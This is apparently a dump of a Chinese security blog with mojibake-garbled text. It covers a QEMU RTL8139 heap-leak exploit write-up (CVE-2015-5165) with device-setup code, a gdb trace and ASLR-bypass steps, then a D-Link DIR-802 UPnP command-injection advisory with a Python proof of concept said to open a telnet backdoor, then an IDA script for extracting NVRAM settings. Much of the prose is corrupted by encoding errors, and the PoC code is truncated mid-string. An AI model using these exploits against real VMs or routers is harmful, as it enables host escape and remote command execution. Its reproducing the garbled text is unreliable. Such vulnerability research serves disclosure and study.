tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size); &#125; /* more code follows */&#125; å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¼ªé€ äº†é•¿åº¦æŸåçš„ç•¸å½¢æ•°æ®åŒ…ï¼ˆä¾‹å¦‚ipâ†’ip_len = hlen-1ï¼‰ï¼Œåˆ™å¯èƒ½ä¼šä»QEMUçš„å †å†…å­˜ä¸­æ³„æ¼å¤§çº¦64 KBã€‚ç½‘å¡è®¾å¤‡ä»¿çœŸå™¨å°†é€šè¿‡å‘é€43ä¸ªåˆ†æ®µçš„æ•°æ®åŒ…ç»“æŸï¼Œ è€Œä¸æ˜¯å‘é€å•ä¸ªæ•°æ®åŒ…ã€‚ 3.2 Setting up the Cardä¸ºäº†å‘é€æ ¼å¼é”™è¯¯çš„æ•°æ®åŒ…å¹¶è¯»å–æ³„æ¼çš„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¡ä¸Šé…ç½®Rxå’ŒTxæè¿°ç¬¦ç¼“å†²åŒºï¼Œå¹¶è®¾ç½®ä¸€äº›æ ‡å¿—ï¼Œä»¥ä½¿æˆ‘ä»¬çš„æ•°æ®åŒ…æµç»æ˜“å—æ”»å‡»çš„ä»£ç è·¯å¾„ã€‚ ä¸‹å›¾æ˜¾ç¤ºäº†RTL8139å¯„å­˜å™¨ã€‚ æˆ‘ä»¬å°†ä¸è¯¦è¿°æ‰€æœ‰è¿™äº›å†…å®¹ï¼Œè€Œæ˜¯ä»…è¯¦è¿°ä¸æˆ‘ä»¬çš„åˆ©ç”¨ç›¸å…³çš„é‚£äº›å†…å®¹ï¼š 12345678910111213141516171819 +---------------------------+----------------------------+0x00 | MAC0 | MAR0 | +---------------------------+----------------------------+0x10 | TxStatus0 | +--------------------------------------------------------+0x20 | TxAddr0 | +-------------------+-------+----------------------------+0x30 | RxBuf |ChipCmd| | +-------------+------+------+----------------------------+0x40 | TxConfig | RxConfig | ... | +-------------+-------------+----------------------------+ | | | skipping irrelevant registers | | | +---------------------------+--+------+------------------+0xd0 | ... | |TxPoll| ... | +-------+------+------------+--+------+--+---------------+0xe0 | CpCmd | ... |RxRingAddrLO|RxRingAddrHI| ... | +-------+------+------------+------------+---------------+ TxConfig: å¯ç”¨/ç¦ç”¨Txæ ‡å¿—ï¼Œä¾‹å¦‚TxLoopBackï¼ˆå¯ç”¨å›é€æµ‹è¯•æ¨¡å¼ï¼‰ï¼ŒTxCRCï¼ˆä¸å°†CRCé™„åŠ åˆ°Txæ•°æ®åŒ…ï¼‰ç­‰ã€‚ RxConfig: å¯ç”¨/ç¦ç”¨Rxæ ‡å¿—ï¼Œä¾‹å¦‚AcceptBroadcastï¼ˆæ¥å—å¹¿æ’­æ•°æ®åŒ…ï¼‰ï¼ŒAcceptMulticastï¼ˆæ¥å—ç»„æ’­æ•°æ®åŒ…ï¼‰ç­‰ã€‚ CpCmd: C+å‘½ä»¤å¯„å­˜å™¨ï¼Œç”¨äºå¯ç”¨æŸäº›åŠŸèƒ½ï¼Œä¾‹å¦‚CplusRxEndï¼ˆå¯ç”¨æ¥æ”¶ï¼‰ï¼ŒCplusTxEndï¼ˆå¯ç”¨å‘é€ï¼‰ç­‰ã€‚ TxAddr0: Txæè¿°ç¬¦è¡¨çš„ç‰©ç†å†…å­˜åœ°å€ã€‚ RxRingAddrLO: Rxæè¿°ç¬¦è¡¨çš„ä½32ä½ç‰©ç†å†…å­˜åœ°å€ã€‚ RxRingAddrHI: Rxæè¿°ç¬¦è¡¨çš„é«˜32ä½ç‰©ç†å†…å­˜åœ°å€ã€‚ TxPoll:å‘Šè¯‰ç½‘å¡æ£€æŸ¥Txæè¿°ç¬¦ã€‚ Rx/Txæè¿°ç¬¦ ç”±ä»¥ä¸‹ç»“æ„å®šä¹‰ï¼Œå…¶ä¸­buf_loå’Œbuf_hiåˆ†åˆ«æ˜¯Tx/Rxç¼“å†²åŒºçš„ä½32ä½å’Œé«˜32ä½ç‰©ç†å­˜å‚¨åœ°å€ã€‚ è¿™äº›åœ°å€æŒ‡å‘ä¿å­˜è¦å‘é€/æ¥æ”¶çš„æ•°æ®åŒ…çš„ç¼“å†²åŒºï¼Œå¹¶ä¸”å¿…é¡»åœ¨é¡µé¢å¤§å°è¾¹ç•Œä¸Šå¯¹é½ã€‚ å˜é‡dw0å¯¹ç¼“å†²åŒºçš„å¤§å°ä»¥åŠå…¶ä»–æ ‡å¿—ï¼ˆä¾‹å¦‚æ‰€æœ‰æƒæ ‡å¿—ï¼‰è¿›è¡Œç¼–ç ï¼Œä»¥è¡¨ç¤ºç¼“å†²åŒºæ˜¯ç”±ç½‘å¡è¿˜æ˜¯ç”±é©±åŠ¨ç¨‹åºæ‹¥æœ‰ã€‚ 123456struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t **buf_lo**; uint32_t **buf_hi**;&#125;; ç½‘å¡é€šè¿‡in() out()åŸè¯­ï¼ˆæ¥è‡ªsys/io.hï¼‰è¿›è¡Œé…ç½®ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…·æœ‰CAP_SYS_RAWIOç‰¹æƒã€‚ ä»¥ä¸‹ä»£ç æ®µé…ç½®äº†ç½‘å¡å¹¶è®¾ç½®äº†ä¸€ä¸ªTxæè¿°ç¬¦ã€‚ 12345678910111213141516171819202122232425262728#define RTL8139_PORT 0xc000#define RTL8139_BUFFER_SIZE 1500struct rtl8139_desc desc;void *rtl8139_tx_buffer;uint32_t phy_mem;rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);memset(&amp;desc, 0, sizeof(struct rtl8139_desc));desc-&gt;dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS;desc-&gt;dw0 += RTL8139_BUFFER_SIZE;desc.buf_lo = phy_mem;iopl(3);outl(TxLoopBack, RTL8139_PORT + TxConfig);outl(AcceptMyPhys, RTL8139_PORT + RxConfig);outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);outl(phy_mem, RTL8139_PORT + TxAddr0);outl(0x0, RTL8139_PORT + TxAddr0 + 0x4); 3.3 Exploitphrackéšé™„çš„æºä»£ç ä¸­æä¾›äº†å®Œæ•´çš„åˆ©ç”¨ï¼ˆcve-2015-5165.cï¼‰ã€‚ï¼ˆ uuencodeç”¨äºå°†äºŒè¿›åˆ¶æ–‡ä»¶ç¼–ç ä¸ºçº¯ASCIIæ–‡æœ¬ï¼Œä»¥ä¾¿å¯ä»¥é€šè¿‡ç”µå­é‚®ä»¶å‘é€å®ƒä»¬ã€‚ï¼‰cve-2015-5165.cä¾èµ–qemu.hå¤´æ–‡ä»¶ä¸­çš„å‡½æ•°åç§»åœ°å€ï¼Œå› æ­¤é¦–å…ˆéœ€è¦é€šè¿‡build-exploit.shæ¥è¿›è¡Œè®¡ç®—ã€‚ 1./build-exploit.sh &apos;/home/han/VMescape/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64&apos; è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºåœ¨ç½‘å¡ä¸Šé…ç½®æ‰€éœ€çš„å¯„å­˜å™¨ï¼Œå¹¶è®¾ç½®Txå’ŒRxç¼“å†²åŒºæè¿°ç¬¦ã€‚ ç„¶åï¼Œå®ƒä¼ªé€ äº†æ ¼å¼é”™è¯¯çš„IPæ•°æ®åŒ…ï¼Œè¯¥IPæ•°æ®åŒ…çš„ç›®çš„åœ°å€å’Œæºåœ°å€ä¸ºç½‘å¡çš„MACåœ°å€ã€‚ è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è®¿é—®å·²é…ç½®çš„Rxç¼“å†²åŒºæ¥è¯»å–æ³„æ¼çš„æ•°æ®ã€‚é€šè¿‡å¯¹qemuè¿è¡Œç¨‹åºä¸‹æ–­ç‚¹ï¼Œå¯ç”¨çœ‹åˆ°æ¼æ´è§¦å‘çš„è¿‡ç¨‹ï¼Œç”±äºip_lenå°äºä¼ªé€ çš„hlenï¼Œå¯¼è‡´æœ€åtcp_data_lenæ¯”å®é™…çš„ tcp æ•°æ®å¤§ï¼Œ å¤šä½™çš„å†…å­˜åŒºä¼šè¢«æ‹·è´åˆ°åŒ…é‡Œå‘é€å‡ºå»ï¼ˆç½‘å¡éœ€è¦é…ç½®ä¸ºloopback å£ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738(gdb) b rtl8139.c:2173Breakpoint 1 at 0x55a5ef757b03: file /home/han/VMescape/qemu/hw/net/rtl8139.c, line 2173.(gdb) cContinuing.Thread 3 &quot;qemu-system-x86&quot; hit Breakpoint 1, rtl8139_cplus_transmit_one (s=0x55a5f26ecfe0)at /home/han/VMescape/qemu/hw/net/rtl8139.c:21732173 if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;(gdb) p/x ip$1 = 0x7ff7d4278b6e(gdb) p/x *ip$2 = &#123;ip_ver_len = 0x45, ip_tos = 0x0, ip_len = 0x1300, ip_id = 0xadde, ip_off = 0x40, ip_ttl = 0x40, ip_p = 0x6,ip_sum = 0xadde, ip_src = 0x10108c0, ip_dst = 0x201a8c0&#125;(gdb) n[Thread 0x7ff7e131f700 (LWP 56763) exited]2179 hlen = IP_HEADER_LENGTH(ip);(gdb) n2180 ip_protocol = ipâ†’ip_p;(gdb) p/x hlen$5 = 0x14(gdb) n2181 ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;(gdb) n2185 if (ip)(gdb) p/x ip_data_len**$7 = 0xffff**(gdb) b rtl8139.c:2231Breakpoint 2 at 0x55a5ef757d42: file /home/han/VMescape/qemu/hw/net/rtl8139.c, line 2231.(gdb) cContinuing.Thread 3 &quot;qemu-system-x86&quot; hit Breakpoint 2, rtl8139_cplus_transmit_one (s=0x55a5f26ecfe0)at /home/han/VMescape/qemu/hw/net/rtl8139.c:22312231 int tcp_data_len = ip_data_len - tcp_hlen;(gdb) n2232 int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;(gdb) p/x tcp_data_len**$8 = 0xffeb** è™šæ‹Ÿæœºå†…éƒ¨çš„ç”¨æˆ·è¿›ç¨‹é€šè¿‡è¯»å–æ”¶åŒ…é˜Ÿåˆ—çš„æ•°æ®åŒ…å°±å¯ä»¥çŸ¥é“è¢«æ³„éœ²çš„é‚£å— qemu å†…å­˜åŒºçš„å†…å®¹ã€‚åœ¨åˆ†ææ³„æ¼çš„æ•°æ®æ—¶ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å­˜åœ¨å¤šä¸ªå‡½æ•°æŒ‡é’ˆã€‚ç»è¿‡è°ƒè¯•ï¼Œå‘ç°è¿™äº›å‡½æ•°æŒ‡é’ˆéƒ½æ˜¯struct ObjectPropertyè¿™ä¸ª qemu å†…éƒ¨ç»“æ„ä½“çš„æ•°æ®ã€‚struct ObjectProperty åŒ…å« 11 ä¸ªæŒ‡é’ˆ, è¿™é‡Œè¾¹æœ‰ 4 ä¸ªå‡½æ•°æŒ‡é’ˆ get/set/resolve/release 12345678910111213typedef struct ObjectProperty&#123; gchar *name; gchar *type; gchar *description; ObjectPropertyAccessor *get; ObjectPropertyAccessor *set; ObjectPropertyResolve *resolve; ObjectPropertyRelease *release; void *opaque; QTAILQ_ENTRY(ObjectProperty) node;&#125; ObjectProperty; QEMUéµå¾ªå¯¹è±¡æ¨¡å‹æ¥ç®¡ç†è®¾å¤‡ï¼Œå†…å­˜åŒºåŸŸç­‰ã€‚å¯åŠ¨æ—¶ï¼ŒQEMUåˆ›å»ºå¤šä¸ªå¯¹è±¡å¹¶ä¸ºå…¶åˆ†é…å±æ€§ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹çš„å‡½æ•°å°†â€œmay-overlapâ€å±æ€§æ·»åŠ ç»™ä¸€ä¸ªå†…å­˜åŒºåŸŸå¯¹è±¡ã€‚ æ­¤å±æ€§å…·æœ‰getteræ–¹æ³•ï¼Œå¯ä»¥æ£€ç´¢æ­¤booleanå±æ€§çš„å€¼ï¼š 1234object_property_add_bool(OBJECT(mr), &quot;may-overlap&quot;, memory_region_get_may_overlap, NULL, /* memory_region_set_may_overlap */ &amp;error_abort); RTL8139ç½‘å¡è®¾å¤‡ä»¿çœŸå™¨åœ¨å †ä¸Šä¿ç•™äº†64 KBçš„ç©ºé—´ä»¥é‡ç»„æ•°æ®åŒ…ã€‚ è¯¥åˆ†é…çš„ç¼“å†²åŒºå¾ˆå¯èƒ½æŠŠé‡Šæ”¾æ‰çš„object propertiesçš„å†…å­˜å ä½äº†ã€‚ åœ¨æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬åœ¨æ³„æ¼çš„å†…å­˜ä¸­æœç´¢å·²çŸ¥çš„å¯¹è±¡å±æ€§ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾80ä¸ªå­—èŠ‚çš„å†…å­˜å—ï¼ˆå—å¤§å°ä¸ºå·²é‡Šæ”¾çš„ObjectPropertyç»“æ„ï¼‰ï¼Œå…¶ä¸­è‡³å°‘è®¾ç½®äº†ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼ˆget, set, resolve or releaseï¼‰ã€‚å³ä½¿è¿™äº›åœ°å€å—ASLRçº¦æŸï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥çŒœæµ‹.textèŠ‚çš„åŸºåœ°å€ã€‚ 0) ä» qemu-system-x86_64 äºŒè¿›åˆ¶æ–‡ä»¶é‡Œæœç´¢ä¸Šè¿° 4 ç±»ç¬¦å·çš„æ‰€æœ‰é™æ€åœ°å€ï¼Œ å¦‚ property_get_bool ç­‰ç¬¦å·çš„åœ°å€ 1) åœ¨è¯»å›æ¥çš„ IP åŒ…çš„æ•°æ®é‡Œæœç´¢å€¼ç­‰äº 0x60 çš„å†…å­˜ ptrï¼Œ å¦‚æœåŒ¹é…åˆ°ï¼Œ è®¤ä¸º (u64*)ptr+1 çš„åœ°æ–¹å°±æ˜¯ä¸€ä¸ªæ½œåœ¨çš„ struct ObjectProperty å¯¹è±¡, å¯¹åº”çš„å‡½æ•°æ˜¯ qemu_get_leaked_chunk 2) åœ¨ 1 æœç´¢åˆ°çš„å†…å­˜ä¸ŠåŒ¹é… 0 æ”¶é›†åˆ°çš„ get/set/resolve/release è¿™å‡ ç§ç¬¦å·çš„é™æ€åœ°å€, åŒ¹é…æ–¹å¼ä¸ºé¡µå†…åç§»ç›¸ç­‰ï¼Œ å¦‚æœåŒ¹é…åˆ°ï¼Œ è®¤ä¸ºå°±æ˜¯ struct ObjectProperty å¯¹è±¡, å¯¹åº”çš„å‡½æ•°æ˜¯ qemu_get_leaked_object_property 3) åœ¨ 2 æœç´¢çš„åŸºç¡€ä¸Šï¼Œ ç”¨ object-&gt;get/set/resolve/release çš„å®é™…åœ°å€å‡å»é™æ€ç¼–è¯‘é‡Œç®—å‡ºæ¥çš„ offset, å¾—åˆ° .text åŠ è½½çš„åœ°å€ å®é™…ä¸Šï¼Œå®ƒä»¬çš„é¡µé¢åç§»æ˜¯å›ºå®šçš„ï¼ˆ12ä¸ªæœ€ä½æœ‰æ•ˆä½æˆ–è™šæ‹Ÿåœ°å€ä¸æ˜¯éšæœºçš„ï¼‰ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›ç®—æ³•æ¥è·å–QEMUä¸€äº›æœ‰ç”¨å‡½æ•°çš„åœ°å€ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥ä»å®ƒä»¬çš„PLTæ¡ç›®ä¸­å¯¼å‡ºæŸäº›LibCå‡½æ•°çš„åœ°å€ï¼Œä¾‹å¦‚mprotect() å’Œsystem()ã€‚æˆ‘ä»¬è¿˜æ³¨æ„åˆ°ï¼Œåœ°å€PHY_MEM + 0x78æ³„æ¼äº†å‡ æ¬¡ï¼Œå…¶ä¸­PHY_MEMæ˜¯åˆ†é…ç»™è¯¥Guestçš„ç‰©ç†å†…å­˜çš„èµ·å§‹åœ°å€ã€‚ æ€»ç»“ï¼šå½“å‰æ¼æ´åˆ©ç”¨ç¨‹åºæœç´¢æ³„æ¼çš„å†…å­˜ï¼Œå¹¶å°è¯•è§£æï¼ˆiï¼‰.textæ®µçš„åŸºåœ°å€å’Œï¼ˆiiï¼‰ç‰©ç†å†…å­˜çš„åŸºåœ°å€ã€‚ 3.4 é‡åˆ°çš„å‡ ä¸ªé—®é¢˜ phrackæä¾›çš„build-exploit.sh, å®ƒæ˜¯ä¸€ä¸ªå·¥å…·è„šæœ¬ï¼Œç”¨æ¥è·å–ä¸€äº›ç¬¦å·çš„ï¼ˆç›¸å¯¹ï¼‰åœ°å€ã€‚åŸå§‹çš„ build-exploit.sh è·å– plt æ®µæ˜¯é€šè¿‡ä¸‹é¢çš„å‘½ä»¤è¡Œï¼š plt**=**$(readelf -S $binary | grep plt | tail -n 1 | awk &#39;{print $2}&#39;) è¿™æ ·è·å–åˆ°çš„æ˜¯ .plt.got æ®µï¼Œåœ¨æˆ‘çš„ç¯å¢ƒé‡Œï¼Œ mprotect ç­‰ç³»ç»Ÿå‡½æ•°ç¬¦å·æ²¡æœ‰åœ¨ .plt.got è¿™ä¸ªæ®µï¼Œè€Œæ˜¯åœ¨ .plt è¿™ä¸ªæ®µã€‚å› æ­¤æ›¿æ¢å¦‚ä¸‹ï¼š 12#plt=$(readelf -S $binary | grep plt | tail -n 1 | awk &apos;&#123;print $2&#125;&apos;)plt=.plt Phrack æ–‡ç« æä¾›çš„ Exploit ä»£ç ä¸­æœç´¢çš„åœ°å€æ˜¯PHY_MEM + 0x78ï¼Œä½†å®é™…ä¸Šå¹¶ä¸å›ºå®šä¸º0x78ï¼Œæ›´é€šç”¨çš„åšæ³•æ˜¯ç»Ÿè®¡æ³„éœ²çš„æ•°æ®ä¸­å‡ºç°çš„ uint64_t ç±»å‹çš„æ•°æ® 0x00007FXXYYZZZZZZ ï¼Œå…¶ä¸­ 7FXXYY å‡ºç°æ¬¡æ•°æœ€å¤šçš„æ•°æ®ï¼Œå°±æ˜¯ QEMU è™šæ‹Ÿæœºç‰©ç†å†…å­˜çš„ç»“æŸåœ°å€ï¼›ä¿®æ”¹ä¹‹åæˆåŠŸè·å¾—ç‰©ç†åœ°å€ é€šè¿‡ gdb è°ƒè¯•éªŒè¯ç»“æœæ­£ç¡®æ€§ï¼š refhttp://jiayy.me/2019/04/15/CVE-2015-5165-7504/http://jiayy.me/2019/04/15/CVE-2015-5165-7504/#cve-2015-5165-exphttps://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://cool-y.github.io/categories/Pwn/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://cool-y.github.io/tags/CVE/"},{"name":"QEMU","slug":"QEMU","permalink":"https://cool-y.github.io/tags/QEMU/"},{"name":"ä¿¡æ¯æ³„éœ²","slug":"ä¿¡æ¯æ³„éœ²","permalink":"https://cool-y.github.io/tags/ä¿¡æ¯æ³„éœ²/"}]},{"title":"DIR-802 OS Command Injection","slug":"DIR-802-OS-Command-Injection","date":"2021-03-02T05:36:32.000Z","updated":"2021-04-10T13:39:29.524Z","comments":true,"path":"2021/03/02/DIR-802-OS-Command-Injection/","link":"","permalink":"https://cool-y.github.io/2021/03/02/DIR-802-OS-Command-Injection/","excerpt":"","text":"D-LINK DIR-802 å‘½ä»¤æ³¨å…¥æ¼æ´ by Cool æ¼æ´å·²æäº¤å‚å•†https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10206 æ¼æ´ç±»å‹CWE-78: Improper Neutralization of Special Elements used in an OS Command (â€˜OS Command Injectionâ€™) å—å½±å“è®¾å¤‡åŠè½¯ä»¶ç‰ˆæœ¬DIR-802 hardware revision Ax before v1.00b05https://pmdap.dlink.com.tw/PMD/GetAgileFile?itemNumber=FIR1300450&amp;fileName=DIR802_FW100b05.zip&amp;fileSize=6163759.0; æ¼æ´æ¦‚è¦DIR-802ä¸­å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„M-SEARCHæ•°æ®åŒ…å‘UPnPæ³¨å…¥ä»»æ„å‘½ä»¤ã€‚ æ¼æ´è¯¦æƒ…ä¸CVE-2020-15893ç›¸ä¼¼ï¼Œåœ¨å›ºä»¶ç‰ˆæœ¬v-1.00b05ä¹‹å‰çš„D-Link DIR-802 A1ä¸Šå‘ç°äº†ä¸€ä¸ªé—®é¢˜ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç«¯å£1900ä¸Šå¯ç”¨äº†é€šç”¨å³æ’å³ç”¨ï¼ˆUPnPï¼‰ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½æ³¨å…¥SSDP M-SEARCHå‘ç°æ•°æ®åŒ…çš„â€œæœç´¢ç›®æ ‡â€ï¼ˆSTï¼‰å­—æ®µæ¥æ‰§è¡Œå‘½ä»¤æ³¨å…¥ã€‚ POC12345678# coding: utf-8import socketimport structbuf = 'M-SEARCH * HTTP/1.1\\r\\nHOST:192.168.0.1:1900\\r\\nST:urn:schemas-upnp-org:services = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)s.connect((\"192.168.0.1\", 1900))s.send(buf)s.close() æ¼æ´å¤ç°ä½¿ç”¨firmadyneè¿›è¡Œå›ºä»¶æ¨¡æ‹Ÿï¼Œè¿è¡ŒUPnPæœåŠ¡ æ”»å‡»è€…å¯ä»¥æ˜¯è¿æ¥åˆ°è·¯ç”±å™¨å±€åŸŸç½‘å†…å¹¶ä¸”èƒ½å¤Ÿå‘UPnPç«¯å£å‘é€è¯·æ±‚çš„ä»»ä½•äººã€‚å¯ä»¥é€šè¿‡ç¼–å†™ç®€å•çš„pythonè„šæœ¬å°†ç²¾å¿ƒåˆ¶ä½œçš„æ•°æ®åŒ…å‘é€åˆ°ç‰¹å®šçš„upnpç«¯å£ï¼Œè¯¥è„šæœ¬éšåå°†ä½œä¸ºç²¾å¿ƒåˆ¶ä½œçš„è¯·æ±‚çš„ä¸€éƒ¨åˆ†æ‰§è¡Œæä¾›çš„å‘½ä»¤ã€‚å…±äº«çš„POCå°†æ‰“å¼€ç«¯å£8089ä¸Šçš„telnetæœåŠ¡ã€‚","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"D-LINK","slug":"D-LINK","permalink":"https://cool-y.github.io/tags/D-LINK/"},{"name":"UPnP","slug":"UPnP","permalink":"https://cool-y.github.io/tags/UPnP/"},{"name":"å›ºä»¶æ¨¡æ‹Ÿ","slug":"å›ºä»¶æ¨¡æ‹Ÿ","permalink":"https://cool-y.github.io/tags/å›ºä»¶æ¨¡æ‹Ÿ/"}]},{"title":"è‡ªåŠ¨åŒ–è·å–nvramé…ç½®","slug":"nvram-config","date":"2021-01-08T08:27:26.000Z","updated":"2021-04-10T13:45:01.826Z","comments":true,"path":"2021/01/08/nvram-config/","link":"","permalink":"https://cool-y.github.io/2021/01/08/nvram-config/","excerpt":"","text":"ARMXä½œè€…è¯´ï¼Œnvramçš„å†…å®¹å¿…é¡»ä»æ­£åœ¨è¿è¡Œçš„è®¾å¤‡ä¸­æå–ã€‚ä¸€ç§æ–¹æ³•æ˜¯è½¬å‚¨åŒ…å«nvramæ•°æ®çš„mtdblockï¼Œ /proc/mtdå¯èƒ½æœ‰åŠ©äºè¯†åˆ«å“ªä¸ªmtdblockåŒ…å«nvramã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯ï¼Œå¦‚æœæ‚¨å¯ä»¥é€šè¿‡UARTè¿›è¡Œå‘½ä»¤è¡Œè®¿é—®ï¼ˆå½“ç„¶å¯ä»¥è®¿é—®å®é™…çš„ç¡¬ä»¶ï¼‰ï¼ŒæŸäº›å›ºä»¶ä¼šæä¾›nvramå‘½ä»¤ï¼Œè¿è¡Œâ€œ nvram showâ€ä¹Ÿå¯ä»¥è·å–nvramå†…å®¹ã€‚https://github.com/therealsaumil/armx/issues/4 çŸ¥é“åˆ›å®‡çš„ç ”ç©¶äººå‘˜è¯´ï¼Œnvramé…ç½®ï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„æ±‡ç¼–ä»£ç é€»è¾‘ï¼ˆé…ç½®çš„æœ‰é—®é¢˜çš„è¯å¾ˆå®¹æ˜“è§¦å‘æ®µé”™è¯¯ï¼‰ã€‚ æˆ‘éœ€è¦æ— éœ€ç¡¬ä»¶è‡ªåŠ¨åŒ–çš„å¤„ç†å¤§æ‰¹è®¾å¤‡çš„nvramé…ç½®ï¼Œä¸Šé¢ä¸¤ç§æ–¹æ³•éƒ½æ— æ³•é€‚ç”¨ã€‚ä½†æˆ‘å‘ç°Netgearçš„nvramé…ç½®æœ‰è¿™ä¸¤ä¸ªteâ€™d upnpç­‰äºŒè¿›åˆ¶ç¨‹åºé€šè¿‡nvram_matchæ¥åŒ¹é…nvramå˜é‡ä¸é¢„æœŸå€¼ libnvramåœ¨dataæ®µå­˜å‚¨äº†è®¾å¤‡çš„é»˜è®¤nvramé…ç½®ï¼Œæ•°æ®æ®µï¼ˆdata segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­å·²åˆå§‹åŒ–ä¸”ä¸ä¸º0çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚æ•°æ®æ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚ äºæ˜¯æ ¹æ®è¿™ä¸¤ä¸ªäº‹å®åšäº†ä¸¤ä¸ªå®éªŒï¼š matchå‡½æ•°è¯¥å‡½æ•°çš„é€»è¾‘å¦‚ä¸‹ï¼Œa1ä¸ºè¦æŸ¥è¯¢çš„keyï¼Œa2ä¸ºå¾…æ¯”è¾ƒçš„å¯¹åº”valueï¼Œè°ƒç”¨nvram_getè·å¾—nvramä¸­a1çš„valueï¼Œç„¶åå’Œa2æ¯”è¾ƒï¼Œç›¸åŒçš„è¯è¿”å›1ã€‚ 123456789101112const char *__fastcall acosNvramConfig_match(int a1, const char *a2)&#123; const char *v2; // r4 const char *result; // r0 int v4; // [sp+0h] [bp-1008h] v2 = a2; result = (const char *)j_nvram_get(a1, &amp;v4, 4096); if ( result ) result = (const char *)(strcmp(result, v2) == 0); return result;&#125; åœ¨upnpäºŒè¿›åˆ¶ç¨‹åºæ±‡ç¼–ä»£ç ä¸­ï¼Œè°ƒç”¨acosNvramConfig_matchæ¥æ¯”è¾ƒnvramæˆ‘åšå‡ºäº†ä¸€ä¸ªå‡è®¾ï¼šæ‰€æœ‰a2éƒ½æ˜¯èƒ½å¤Ÿä½¿ç¨‹åºæ­£å¸¸è¿è¡Œçš„nvramå€¼ï¼Œç°åœ¨æƒ³è¦è·å–å®ƒã€‚ç¼–å†™IDAè„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829def GetAddr(func_name): func_list = Functions() for func in func_list: name = GetFunctionName(func) if func_name == name: print(name,hex(func)) func_addr=func return func_addrfunc_addr = GetAddr(&apos;acosNvramConfig_match&apos;)#func_addr=0xa3d4for x in XrefsTo(func_addr,flags=0): print &quot;XrefsTo nvram-match func addr: %s&quot;%hex(x.frm) match_addr = x.frm val_addr = PrevHead(match_addr) key_addr = PrevHead(val_addr) if GetMnem(key_addr) == &apos;LDR&apos;: instr = GetDisasm(prevaddr) #print(&apos;LDR instruction: %s&apos;%instr) addr = GetOperandValue(key_addr,1) key = GetString(Dword(addr)) print(&apos;nvram key: %s&apos;%key) if GetMnem(val_addr) == &apos;LDR&apos;: instr = GetDisasm(prevaddr) #print(&apos;LDR instruction: %s&apos;%instr) addr = GetOperandValue(val_addr,1) val = GetString(Dword(addr)) print(&apos;nvram value: %s&apos;%val) GetAddr(func_name) æ ¹æ®å‡½æ•°åè·å¾—åœ°å€ï¼Œè¿™é‡Œè·å¾—äº†â€™acosNvramConfig_matchâ€™çš„åœ°å€0xa3d4ï¼› æ‰¾åˆ°æ‰€æœ‰å¼•ç”¨è¿‡è¯¥å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æå–ä½œä¸ºå‚æ•°çš„æ•°æ®ã€‚è·å–åˆ°å‡½æ•°çš„å¼•ç”¨éå¸¸çš„ç®€å•ï¼Œåªéœ€è¦ä½¿ç”¨XrefsTo()è¿™ä¸ªAPIå‡½æ•°å°±èƒ½è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚ valueæ˜¯è°ƒç”¨matchå‡½æ•°çš„å‰ä¸€æ¡æŒ‡ä»¤ï¼›keyæ˜¯è°ƒç”¨matchå‡½æ•°çš„å‰ä¸¤æ¡æŒ‡ä»¤ï¼›æ“ä½œç éƒ½æ˜¯LDR; ä½¿ç”¨GetOperandValue() è¿™ä¸ªæŒ‡ä»¤å¾—åˆ°ç¬¬äºŒä¸ªæ“ä½œæ•°çš„å€¼ã€‚æ³¨æ„è¯¥å€¼å­˜æ”¾çš„æ˜¯â€œå­˜æ”¾å­—ç¬¦ä¸²åœ°å€â€çš„åœ°å€ 